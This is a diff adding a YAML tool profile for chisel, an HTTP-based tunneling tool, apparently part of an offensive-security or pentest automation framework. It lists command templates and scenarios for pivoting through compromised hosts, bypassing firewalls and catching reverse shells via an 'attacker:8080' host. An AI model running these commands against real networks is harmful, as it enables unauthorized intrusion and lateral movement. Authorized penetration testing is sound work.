@@ -1,0 +1,134 @@
+name: chisel
+version: 1.9.1
+category: pivoting_tunneling
+description: "Fast TCP/UDP tunnel over HTTP secured via SSH - essential for pivoting and bypassing firewalls"
+
+capabilities:
+  - tcp_tunneling
+  - udp_tunneling
+  - port_forwarding
+  - reverse_port_forwarding
+  - socks_proxy
+  - pivoting
+
+target_compatibility:
+  os: [windows, linux, macos]
+  protocols: [tcp, udp, http, https]
+
+commands:
+  server_mode:
+    template: "chisel server -p {port} --reverse"
+    description: "Start server with reverse tunneling"
+    output_format: text
+    estimated_time: null
+  
+  client_reverse:
+    template: "chisel client {server_ip}:{port} R:{local_port}:{target_ip}:{target_port}"
+    description: "Reverse port forward"
+    output_format: text
+    estimated_time: null
+  
+  socks_proxy:
+    template: "chisel client {server_ip}:{port} R:socks"
+    description: "Create SOCKS5 proxy"
+    output_format: text
+    estimated_time: null
+  
+  local_forward:
+    template: "chisel client {server_ip}:{port} {local_port}:{target_ip}:{target_port}"
+    description: "Local port forward"
+    output_format: text
+    estimated_time: null
+  
+  authenticated:
+    template: "chisel server -p {port} --auth {username}:{password}"
+    description: "Server with authentication"
+    output_format: text
+    estimated_time: null
+
+output_format: text
+requires_auth: false
+requires_root: false
+
+tunnel_types:
+  local_forward: "Forwards traffic from client to target through server"
+  reverse_forward: "Forwards traffic from server to client (useful when client behind firewall)"
+  socks_proxy: "Creates SOCKS5 proxy for dynamic port forwarding"
+
+use_cases:
+  pivoting: "Access internal networks through compromised host"
+  firewall_bypass: "Tunnel through HTTP/HTTPS to bypass egress filtering"
+  port_forwarding: "Forward services through intermediate server"
+  double_pivoting: "Chain multiple tunnels for deep network access"
+
+complementary_tools:
+  - socat         # Alternative tunneling
+  - ssh           # Native tunneling (if available)
+  - netcat        # Simple port forwarding
+  - proxychains   # Use with SOCKS proxy
+
+known_issues:
+  - "Requires chisel binary on both ends"
+  - "HTTP tunneling can be detected"
+  - "May require firewall rules"
+  - "Performance overhead vs native SSH"
+
+success_indicators:
+  - "server: Listening"
+  - "client: Connected"
+  - "Tunnel established"
+
+failure_indicators:
+  - "connection refused"
+  - "authentication failed"
+  - "timeout"
+
+installation:
+  go: "go install github.com/jpillora/chisel@latest"
+  github: "https://github.com/jpillora/chisel/releases"
+  binary: "Download pre-compiled binaries"
+
+effectiveness_baseline:
+  pivoting: 0.92
+  firewall_bypass: 0.85
+  deep_pivoting: 0.75
+
+important_flags:
+  server:
+    -p: "Port number"
+    --reverse: "Allow reverse tunnels"
+    --auth: "Authentication (user:pass)"
+    --socks5: "Enable SOCKS5 proxy"
+  client:
+    R:: "Reverse tunnel prefix"
+    --auth: "Authentication (user:pass)"
+    --keepalive: "Keepalive interval"
+
+common_scenarios:
+  reverse_shell_pivot:
+    server: "chisel server -p 8080 --reverse"
+    client: "chisel client attacker:8080 R:4444:localhost:4444"
+    use: "Catch reverse shells through pivot"
+  
+  socks_pivoting:
+    server: "chisel server -p 8080 --reverse"
+    client: "chisel client attacker:8080 R:socks"
+    use: "proxychains nmap 172.16.0.0/24"
+  
+  rdp_forward:
+    server: "chisel server -p 8080 --reverse"
+    client: "chisel client attacker:8080 R:3389:target:3389"
+    use: "Access internal RDP"
+
+advantages:
+  - "Single binary, easy to deploy"
+  - "Cross-platform (Windows, Linux, macOS)"
+  - "HTTP-based tunneling (firewall friendly)"
+  - "Built-in encryption via SSH"
+  - "Fast and lightweight"
+
+performance_notes:
+  - "Faster than HTTP CONNECT proxies"
+  - "Lower overhead than VPN"
+  - "Handles multiple connections"
+  - "Suitable for production pivoting"
